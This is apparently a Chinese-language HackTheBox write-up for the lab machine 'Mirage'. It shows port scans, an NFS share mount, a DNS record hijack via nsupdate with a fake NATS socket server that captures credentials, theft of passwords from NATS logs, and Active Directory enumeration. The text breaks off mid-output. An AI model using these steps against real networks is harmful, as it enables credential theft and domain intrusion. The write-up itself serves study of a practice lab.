{"pageProps":{"postData":{"id":"HackTheBoxSeason8 - Mirage","contentHtml":"<h1>Season8 - Mirage</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Mirage\">https://app.hackthebox.com/machines/Mirage</a> | <code>Windows</code> | <code>Hard</code></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">➜  Mirage nmap -sT -min-rate 5000 -p- 10.10.11.78\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 21:20 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.78\nHost is up (0.055s latency).\nNot shown: 65505 closed tcp ports (conn-refused)\nPORT      STATE SERVICE\n53/tcp    open  domain\n88/tcp    open  kerberos-sec\n111/tcp   open  rpcbind\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n2049/tcp  open  nfs\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n4222/tcp  open  vrml-multi-use\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49668/tcp open  unknown\n50441/tcp open  unknown\n60301/tcp open  unknown\n60308/tcp open  unknown\n60309/tcp open  unknown\n60322/tcp open  unknown\n60325/tcp open  unknown\n60342/tcp open  unknown\n60365/tcp open  unknown\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 13.98 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mirage nmap -sT -A -p $(<span class=\"hljs-built_in\">cat</span> port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | <span class=\"hljs-built_in\">paste</span> -sd <span class=\"hljs-string\">','</span>) 10.10.11.78\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-20 21:23 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.78\nHost is up (0.075s latency).\n\nPORT      STATE SERVICE         VERSION\n53/tcp    open  domain          Simple DNS Plus\n88/tcp    open  kerberos-sec    Microsoft Windows Kerberos (server <span class=\"hljs-keyword\">time</span>: 2025-07-20 20:00:10Z)\n111/tcp   open  rpcbind?\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  2,3         2049/udp   nfs\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|_  100005  1,2,3       2049/udp6  mountd\n135/tcp   open  msrpc           Microsoft Windows RPC\n139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn\n389/tcp   open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE\n| Not valid before: 2025-07-04T19:58:41\n|_Not valid after:  2105-07-04T19:58:41\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http      Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE\n| Not valid before: 2025-07-04T19:58:41\n|_Not valid after:  2105-07-04T19:58:41\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n2049/tcp  open  mountd          1-3 (RPC <span class=\"hljs-comment\">#100005)</span>\n3268/tcp  open  ldap            Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE\n| Not valid before: 2025-07-04T19:58:41\n|_Not valid after:  2105-07-04T19:58:41\n3269/tcp  open  ssl/ldap        Microsoft Windows Active Directory LDAP (Domain: mirage.htb0., Site: Default-First-Site-Name)\n|_ssl-<span class=\"hljs-built_in\">date</span>: TLS randomness does not represent <span class=\"hljs-keyword\">time</span>\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:dc01.mirage.htb, DNS:mirage.htb, DNS:MIRAGE\n| Not valid before: 2025-07-04T19:58:41\n|_Not valid after:  2105-07-04T19:58:41\n4222/tcp  open  vrml-multi-use?\n| fingerprint-strings:\n|   GenericLines:\n|     INFO {<span class=\"hljs-string\">\"server_id\"</span>:<span class=\"hljs-string\">\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"</span>,<span class=\"hljs-string\">\"server_name\"</span>:<span class=\"hljs-string\">\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"</span>,<span class=\"hljs-string\">\"version\"</span>:<span class=\"hljs-string\">\"2.11.3\"</span>,<span class=\"hljs-string\">\"proto\"</span>:1,<span class=\"hljs-string\">\"git_co\nmmit\"</span>:<span class=\"hljs-string\">\"a82cfda\"</span>,<span class=\"hljs-string\">\"go\"</span>:<span class=\"hljs-string\">\"go1.24.2\"</span>,<span class=\"hljs-string\">\"host\"</span>:<span class=\"hljs-string\">\"0.0.0.0\"</span>,<span class=\"hljs-string\">\"port\"</span>:4222,<span class=\"hljs-string\">\"headers\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"auth_required\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"max_payload\"</span>:1048576,<span class=\"hljs-string\">\"jetstream\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"client_id\"</span>:400,<span class=\"hljs-string\">\"client_ip\"</span>:<span class=\"hljs-string\">\"&#x3C;Your-IP>\"</span>,<span class=\"hljs-string\">\"xkey\"</span>:<span class=\"hljs-string\">\"XB2NV6\nU7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\"</span>}\n|     -ERR <span class=\"hljs-string\">'Authorization Violation'</span>\n|   GetRequest:\n|     INFO {<span class=\"hljs-string\">\"server_id\"</span>:<span class=\"hljs-string\">\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"</span>,<span class=\"hljs-string\">\"server_name\"</span>:<span class=\"hljs-string\">\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"</span>,<span class=\"hljs-string\">\"version\"</span>:<span class=\"hljs-string\">\"2.11.3\"</span>,<span class=\"hljs-string\">\"proto\"</span>:1,<span class=\"hljs-string\">\"git_co\nmmit\"</span>:<span class=\"hljs-string\">\"a82cfda\"</span>,<span class=\"hljs-string\">\"go\"</span>:<span class=\"hljs-string\">\"go1.24.2\"</span>,<span class=\"hljs-string\">\"host\"</span>:<span class=\"hljs-string\">\"0.0.0.0\"</span>,<span class=\"hljs-string\">\"port\"</span>:4222,<span class=\"hljs-string\">\"headers\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"auth_required\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"max_payload\"</span>:1048576,<span class=\"hljs-string\">\"jetstream\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"client_id\"</span>:401,<span class=\"hljs-string\">\"client_ip\"</span>:<span class=\"hljs-string\">\"&#x3C;Your-IP>\"</span>,<span class=\"hljs-string\">\"xkey\"</span>:<span class=\"hljs-string\">\"XB2NV6\nU7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\"</span>}\n|     -ERR <span class=\"hljs-string\">'Authorization Violation'</span>\n|   HTTPOptions:\n|     INFO {<span class=\"hljs-string\">\"server_id\"</span>:<span class=\"hljs-string\">\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"</span>,<span class=\"hljs-string\">\"server_name\"</span>:<span class=\"hljs-string\">\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"</span>,<span class=\"hljs-string\">\"version\"</span>:<span class=\"hljs-string\">\"2.11.3\"</span>,<span class=\"hljs-string\">\"proto\"</span>:1,<span class=\"hljs-string\">\"git_co\n|     -ERR 'Authorization Violation'\n|   NULL:\n|     INFO {\"</span>server_id<span class=\"hljs-string\">\":\"</span>NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY<span class=\"hljs-string\">\",\"</span>server_name<span class=\"hljs-string\">\":\"</span>NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY<span class=\"hljs-string\">\",\"</span>version<span class=\"hljs-string\">\":\"</span>2.11.3<span class=\"hljs-string\">\",\"</span>proto<span class=\"hljs-string\">\":1,\"</span>git_co\nmmit<span class=\"hljs-string\">\":\"</span>a82cfda<span class=\"hljs-string\">\",\"</span>go<span class=\"hljs-string\">\":\"</span>go1.24.2<span class=\"hljs-string\">\",\"</span>host<span class=\"hljs-string\">\":\"</span>0.0.0.0<span class=\"hljs-string\">\",\"</span>port<span class=\"hljs-string\">\":4222,\"</span>headers<span class=\"hljs-string\">\":true,\"</span>auth_required<span class=\"hljs-string\">\":true,\"</span>max_payload<span class=\"hljs-string\">\":1048576,\"</span>jetstream<span class=\"hljs-string\">\":true,\"</span>client_id<span class=\"hljs-string\">\":399,\"</span>client_ip<span class=\"hljs-string\">\":\"</span>&#x3C;Your-IP><span class=\"hljs-string\">\",\"</span>xkey<span class=\"hljs-string\">\":\"</span>XB2NV6\nU7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX<span class=\"hljs-string\">\"}\n|_    -ERR 'Authentication Timeout'\n5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf          .NET Message Framing\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows 10 1703 or Windows 11 21H2 (97%), Microsoft Windows Server 2022 (96%), Windows Server 2019 (95%), Microsoft Windows Server 2012 or 2012 R2 (94%), Micro\nsoft Windows 10 1703 (93%), Windows Server 2022 (93%), Microsoft Windows Server 2016 or Server 2019 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windo\nws Server 2016 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n| smb2-time:\n|   date: 2025-07-20T20:01:00\n|_  start_date: N/A\n|_clock-skew: 6h36m31s\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT      ADDRESS\n1   92.73 ms 10.10.16.1\n2   52.80 ms 10.10.11.78\n</span></code></pre>\n<h3>枚举测试</h3>\n<p><code>SMB</code> 匿名测试</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage smbclient -L 10.10.11.78 -U anonymous\nsession setup failed: NT_STATUS_NOT_SUPPORTED\n</code></pre>\n<p><code>RPC</code> 匿名测试</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage rpcclient 10.10.11.78 -U <span class=\"hljs-string\">\"\"</span> -N -c enumdomusers\nCannot connect to server.  Error was NT_STATUS_NOT_SUPPORTED\n</code></pre>\n<p><code>NFS</code> 枚举</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage showmount -e 10.10.11.78             \nExport list <span class=\"hljs-keyword\">for</span> 10.10.11.78:\n/MirageReports (everyone)\n</code></pre>\n<p>发现 <code>/MirageReports</code></p>\n<p>将其挂载到本机上</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage <span class=\"hljs-built_in\">mkdir</span> MirageReports                                  \n➜  Mirage mount -t nfs 10.10.11.78:/MirageReports ./MirageReports\n</code></pre>\n<p>里边是两个<code>PDF</code>文件</p>\n<pre><code class=\"hljs language-bash\">➜  MirageReports <span class=\"hljs-built_in\">ls</span>\nIncident_Report_Missing_DNS_Record_nats-svc.pdf  Mirage_Authentication_Hardening_Report.pdf\n</code></pre>\n<p>翻译过来大概就是：事件报告缺失DNS记录nats-svc、Mirage身份验证强化报告</p>\n<p>一些重要内容：</p>\n<ol>\n<li>\n<p>2025年5月3日，开发团队报告称，他们无法解析主机名 <code>nats-svc.mirage.htb</code>。该主机名对于与托管在 <code>Mirage</code> 域上的 <code>NATS</code> 消息系统进行内部服务通信至关重要。</p>\n</li>\n<li>\n<p><code>nats-svc.mirage.htb</code></p>\n</li>\n<li>\n<p>连接的照片</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image1.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>另一个大概就是要弃用 <code>NTLM</code> 启动<code>Kerberos</code> ，但现在应该不完全是</p>\n</li>\n<li>\n<p><code>ad-security@mirage.htb</code></p>\n</li>\n</ol>\n<h2>劫持 NATS Server</h2>\n<p>到这里一头雾水，抄了下作业</p>\n<p>原理大概就是我们模仿 <code>Nats</code>服务器</p>\n<p>我们首先使用 <code>nsupdate</code> 来让目标DNS 服务器（DC）将记录<code>nats-svc.mirage.htb</code> 更新为我们的<code>IP</code></p>\n<p>然后我们写一个 <code>Socket</code> 脚本，监听 <code>4222</code> 端口，并且返回数据给对方，我们再接收用户登录的数据</p>\n<p>我们首先访问<code>nats-svc.mirage.htb 4222</code> 看一下服务器会回复什么信息</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage nc nats-svc.mirage.htb 4222\nINFO {<span class=\"hljs-string\">\"server_id\"</span>:<span class=\"hljs-string\">\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"</span>,<span class=\"hljs-string\">\"server_name\"</span>:<span class=\"hljs-string\">\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\"</span>,<span class=\"hljs-string\">\"version\"</span>:<span class=\"hljs-string\">\"2.11.3\"</span>,<span class=\"hljs-string\">\"proto\"</span>:1,<span class=\"hljs-string\">\"git_commit\"</span>:<span class=\"hljs-string\">\"a82cfda\"</span>,<span class=\"hljs-string\">\"go\"</span>:<span class=\"hljs-string\">\"go1.24.2\"</span>,<span class=\"hljs-string\">\"host\"</span>:<span class=\"hljs-string\">\"0.0.0.0\"</span>,<span class=\"hljs-string\">\"port\"</span>:4222,<span class=\"hljs-string\">\"headers\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"auth_required\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"max_payload\"</span>:1048576,<span class=\"hljs-string\">\"jetstream\"</span>:<span class=\"hljs-literal\">true</span>,<span class=\"hljs-string\">\"client_id\"</span>:595,<span class=\"hljs-string\">\"client_ip\"</span>:<span class=\"hljs-string\">\"&#x3C;Your-IP>\"</span>,<span class=\"hljs-string\">\"xkey\"</span>:<span class=\"hljs-string\">\"XB2NV6U7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\"</span>} \n-ERR <span class=\"hljs-string\">'Authentication Timeout'</span>\n</code></pre>\n<p>放到脚本 <code>fake_server.py</code> 中</p>\n<pre><code class=\"hljs language-bash\">import socket\n<span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">'[+] 模拟 Nats 服务器开启：'</span>)\ns = socket.socket()\ns.bind((\"<span class=\"hljs-number\">0.0</span>.<span class=\"hljs-number\">0.0</span>\",<span class=\"hljs-number\">4222</span>))\ns.listen(5)\n\n<span class=\"hljs-keyword\">while</span> True:\n    c,addr = s.accept()\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[*] 连接的地址是:\"</span>,addr)\n    c.sendall(b<span class=\"hljs-string\">'INFO {\"server_id\":\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\",\"server_name\":\"NBFHGFVN5SFGGOMK77DO2ZMPJKCOCALBS4HP4ZXDJFQLOFSY77YOVZKY\",\"version\":\"2.11.3\",\"proto\":1,\"git_commit\":\"a82cfda\",\"go\":\"go1.24.2\",\"host\":\"0.0.0.0\",\"port\":4222,\"headers\":true,\"auth_required\":true,\"max_payload\":1048576,\"jetstream\":true,\"client_id\":595,\"client_ip\":\"&#x3C;Your-IP>\",\"xkey\":\"XB2NV6U7Z427TDUHH5JKDGOJXJRXP5LO674AGWTYTYQNQKVZCLYD6AHX\"}\\r\\n'</span>)\n    \n    data = c.recv(1024)\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"[+] 接收到的数据是:\"</span>,data)\n    c.close()\n</code></pre>\n<p>这里开始攻击</p>\n<p>首先使用 <code>nsupdate</code> 来更新目标服务器的记录</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage nsupdate \n> server 10.10.11.78\n> update add nats-svc.mirage.htb 3600 IN A &#x3C;Your-IP>\n> send\n\n➜  Mirage python fake_server.py\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image2.png\" alt=\"image.png\"></p>\n<p>这样就接收到了对方传过来的的凭据：<code>Dev_Account_A</code>:<code>hx5h7F5554fP@1337!</code></p>\n<p>只能说大佬们的思路真的强</p>\n<h2>Nats Server 交互</h2>\n<p>拿到凭据我们就可以开始和目标服务器开始交互了</p>\n<p>交互工具：<a href=\"https://github.com/nats-io/natscli?tab=readme-ov-file#installation\">https://github.com/nats-io/natscli?tab=readme-ov-file#installation</a></p>\n<p>和目标服务器进行交互</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage nats context add mirage --server nats://nats-svc.mirage.htb --user <span class=\"hljs-string\">'Dev_Account_A'</span> --password <span class=\"hljs-string\">'hx5h7F5554fP@1337!'</span> --<span class=\"hljs-keyword\">select</span>\nNATS Configuration Context <span class=\"hljs-string\">\"mirage\"</span>\n\n  Server URLs: nats://nats-svc.mirage.htb\n     Username: Dev_Account_A\n     Password: ******************\n         Path: /root/.config/nats/context/mirage.json\n   Connection: OK\n\n➜  Mirage nats stream <span class=\"hljs-built_in\">ls</span>\n╭─────────────────────────────────────────────────────────────────────────────────╮\n│                                        Streams                                  │\n├───────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤\n│ Name      │ Description │ Created             │ Messages │ Size  │ Last Message │\n├───────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤\n│ auth_logs │             │ 2025-05-05 15:18:19 │ 5        │ 570 B │ 76d14h52m20s │\n╰───────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯\n\n➜  Mirage nats consumer add auth_logs temp_reader --pull --inactive-threshold 1m\n\n[mirage] ? Start policy (all, new, last, subject, 1h, msg sequence) all\n[mirage] ? Acknowledgment policy explicit\n[mirage] ? Replay policy instant\n[mirage] ? Filter Stream by subjects (blank <span class=\"hljs-keyword\">for</span> all) \n[mirage] ? Maximum Allowed Deliveries -1\n[mirage] ? Maximum Acknowledgments Pending 0\n[mirage] ? Deliver headers only without bodies No\n[mirage] ? Add a Retry Backoff Policy No\nInformation <span class=\"hljs-keyword\">for</span> Consumer auth_logs > temp_reader created 2025-07-21 06:16:40\n\nConfiguration:\n\n                    Name: temp_reader\n               Pull Mode: <span class=\"hljs-literal\">true</span>\n          Deliver Policy: All\n              Ack Policy: Explicit\n                Ack Wait: 30.00s\n           Replay Policy: Instant\n         Max Ack Pending: 1,000\n       Max Waiting Pulls: 512\n      Inactive Threshold: 1m0s\n\nState:\n\n            Host Version: 2.11.3\n      Required API Level: 0 hosted at level 1\n  Last Delivered Message: Consumer sequence: 0 Stream sequence: 0\n    Acknowledgment Floor: Consumer sequence: 0 Stream sequence: 0\n        Outstanding Acks: 0 out of maximum 1,000\n    Redelivered Messages: 0\n    Unprocessed Messages: 5\n           Waiting Pulls: 0 of maximum 512\n           \n➜  Mirage nats consumer next auth_logs temp_reader --all\n[23:40:36] subj: logs.auth / tries: 1 / cons <span class=\"hljs-built_in\">seq</span>: 4 / str <span class=\"hljs-built_in\">seq</span>: 4 / pending: 1\n\n{<span class=\"hljs-string\">\"user\"</span>:<span class=\"hljs-string\">\"david.jjackson\"</span>,<span class=\"hljs-string\">\"password\"</span>:<span class=\"hljs-string\">\"pN8kQmn6b86!1234@\"</span>,<span class=\"hljs-string\">\"ip\"</span>:<span class=\"hljs-string\">\"10.10.10.20\"</span>}\n\nAcknowledged message\n</code></pre>\n<p>得到一个用户凭据<code>david.jjackson</code>:<code>N8kQmn6b86!1234@</code></p>\n<p>测试凭据，记得要使用 <code>Kerberos</code> 协议</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage nxc smb dc01.mirage.htb -u david.jjackson -p <span class=\"hljs-string\">'pN8kQmn6b86!1234@'</span> -k                             \nSMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\\david.jjackson:pN8kQmn6b86!1234@ \n\n➜  Mirage nxc ldap 10.10.11.78 -u david.jjackson -p <span class=\"hljs-string\">'pN8kQmn6b86!1234@'</span> -k                             \nLDAP        10.10.11.78     389    DC01             [*] None (name:DC01) (domain:mirage.htb) \nLDAP        10.10.11.78     389    DC01             [+] mirage.htb\\david.jjackson:pN8kQmn6b86!1234@  \n</code></pre>\n<p>再生成<code>krb5.conf</code> 文件</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage nxc smb dc01.mirage.htb -u david.jjackson -p <span class=\"hljs-string\">'pN8kQmn6b86!1234@'</span> -k --generate-krb5-file /etc/krb5.conf\nSMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\\david.jjackson:pN8kQmn6b86!1234@ \n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Mirage <span class=\"hljs-built_in\">cat</span> /etc/krb5.conf\n\n[libdefaults]\n    dns_lookup_kdc = <span class=\"hljs-literal\">false</span>\n    dns_lookup_realm = <span class=\"hljs-literal\">false</span>\n    default_realm = MIRAGE.HTB\n\n[realms]\n    MIRAGE.HTB = {\n        kdc = dc01.mirage.htb\n        admin_server = dc01.mirage.htb\n        default_domain = mirage.htb\n    }\n\n[domain_realm]\n    .mirage.htb = MIRAGE.HTB\n    mirage.htb = MIRAGE.HTB\n</code></pre>\n<h2>域分析</h2>\n<p>收集信息</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage bloodhound-python -d <span class=\"hljs-string\">'mirage.htb'</span> -ns 10.10.11.78 --zip -c All -dc <span class=\"hljs-string\">'dc01.mirage.htb'</span> -u <span class=\"hljs-string\">'david.jjackson'</span> -p <span class=\"hljs-string\">'pN8kQmn6b86!1234@'</span> -k\nINFO: BloodHound.py <span class=\"hljs-keyword\">for</span> BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: mirage.htb\nINFO: Getting TGT <span class=\"hljs-keyword\">for</span> user\nINFO: Connecting to LDAP server: dc01.mirage.htb\nINFO: Found 1 domains\nINFO: Found 1 domains <span class=\"hljs-keyword\">in</span> the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: dc01.mirage.htb\nINFO: Found 12 <span class=\"hljs-built_in\">users</span>\nINFO: Found 57 <span class=\"hljs-built_in\">groups</span>\nINFO: Found 2 gpos\nINFO: Found 21 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.mirage.htb\nINFO: Done <span class=\"hljs-keyword\">in</span> 00M 14S\nINFO: Compressing output into 20250721063431_bloodhound.zip\n</code></pre>\n<p>用户组信息</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image3.png\" alt=\"image.png\"></p>\n<p>其中 <code>NATHAN.AADAM</code> 用户属于远程管理组，暂时是目标用户</p>\n<p><img src=\"/post-images/HackTheBoxSeason8%20-%20Mirage/image4.png\" alt=\"image.png\"></p>\n<h2>横线移动</h2>\n<h3>To NATHAN.AADAM</h3>\n<p>尝试寻找未开启预认证的用户，无果</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage GetNPUsers.py -dc-ip 10.10.11.78 mirage.htb/ -usersfile <span class=\"hljs-built_in\">users</span> -k\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n/root/.local/bin/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled <span class=\"hljs-keyword\">for</span> removal <span class=\"hljs-keyword\">in</span> a future version. Use timezone-aware objects to represent datetimes <span class=\"hljs-keyword\">in</span> UTC: datetime.datetime.now(datetime.UTC).\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] User NATHAN.AADAM doesn<span class=\"hljs-string\">'t have UF_DONT_REQUIRE_PREAUTH set\n[-] User MARK.BBOND doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class=\"hljs-built_in\">set</span>\n[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\n[-] User DEV_ACCOUNT_A doesn<span class=\"hljs-string\">'t have UF_DONT_REQUIRE_PREAUTH set\n[-] User DEV_ACCOUNT_B doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class=\"hljs-built_in\">set</span>\n</code></pre>\n<p>扒拉 <code>SMB</code> 的文件，无果</p>\n<pre><code class=\"hljs language-bash\">➜  Mirage nxc smb dc01.mirage.htb -u david.jjackson -p <span class=\"hljs-string\">'pN8kQmn6b86!1234@'</span> -k -M spider_plus -o DOWNLOAD_FLAG=True\nSMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:False) (NTLM:False)\nSMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\\david.jjackson:pN8kQmn6b86!1234@ \nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] Started module spidering_plus with the following options:\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]  DOWNLOAD_FLAG: True\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]     STATS_FLAG: True\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] EXCLUDE_FILTER: [<span class=\"hljs-string\">'print$'</span>, <span class=\"hljs-string\">'ipc$'</span>]\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]   EXCLUDE_EXTS: [<span class=\"hljs-string\">'ico'</span>, <span class=\"hljs-string\">'lnk'</span>]\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]  MAX_FILE_SIZE: 50 KB\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*]  OUTPUT_FOLDER: /root/.nxc/modules/nxc_spider_plus\nSMB         dc01.mirage.htb 445    dc01             [*] Enumerated shares\nSMB         dc01.mirage.htb 445    dc01             Share           Permissions     Remark\nSMB         dc01.mirage.htb 445    dc01             -----           -----------     ------\nSMB         dc01.mirage.htb 445    dc01             ADMIN$                          Remote Admin\nSMB         dc01.mirage.htb 445    dc01             C$                              Default share\nSMB         dc01.mirage.htb 445    dc01             IPC$            READ            Remote IPC\nSMB         dc01.mirage.htb 445    dc01             NETLOGON        READ            Logon server share \nSMB         dc01.mirage.htb 445    dc01             SYSVOL          READ            Logon server share\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [+] Saved share-file metadata to <span class=\"hljs-string\">\"/root/.nxc/modules/nxc_spider_plus/dc01.mirage.htb.json\"</span>.\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] SMB Filtered Shares:  1\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] Total folders found:  25\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] Total files found:    6\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] File size average:    1.43 KB\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] File size min:        23 B\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] File size max:        4.25 KB\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] File unique exts:     4 (pol, inf, csv, ini)\nSPIDER_PLUS dc01.mirage.htb 445    dc01             [*] Downloads successful: 